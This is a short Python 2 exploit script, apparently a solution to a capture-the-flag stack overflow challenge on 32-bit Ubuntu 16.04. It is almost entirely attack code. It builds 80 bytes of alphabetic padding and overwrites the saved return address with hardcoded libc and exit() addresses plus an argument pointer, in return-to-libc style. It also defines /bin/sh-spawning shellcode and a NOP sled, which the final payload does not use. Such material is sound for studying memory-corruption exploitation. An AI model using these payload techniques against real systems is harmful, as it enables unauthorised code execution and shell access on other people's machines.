#!/usr/bin/python

#Tested on Ubuntu 16.04

offset=80

#offset is calculated at 80, after supplying a payload of size 300 to the stack variable
#this challenge arranges the stack in a weird way 
#padding="A"*offset
padding=""
#Alphabetic sequence payload. 4A's 4B's.......(20 letters) 20x4=80 our offset



'''
Sequence of 4's in stack.


'''
#Note that eip gets filled twice, Sequence of Q's has been overwritten. The last eip is the intended address.

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

for i in range(20):
    padding+=chr(65+i)*4

nopsled="\x90"*100
#bffe:3070-middle of nop sled

##b7ee4c06 libc syscall 0xb7e3cdb0
eip="\xb0\xcd\xe3\xb7"

## arg1="exit()" #ret address b766b8bf
## b7 ff 3c 0b
exitaddr="\x0b\x3c\xff\xb7"

##0x00000000 bf ff f3 7a
##="0x00000000b7f5db0b"
arg1="\x7b\xf3\xff\xbf"
#arg1="\x5c\x5c\x68\x73\x61\x62\x5c\x5c\x6e\x69\x62\x5c\x5c"

exploit=padding+eip+exitaddr+arg1+"\x00"

print exploit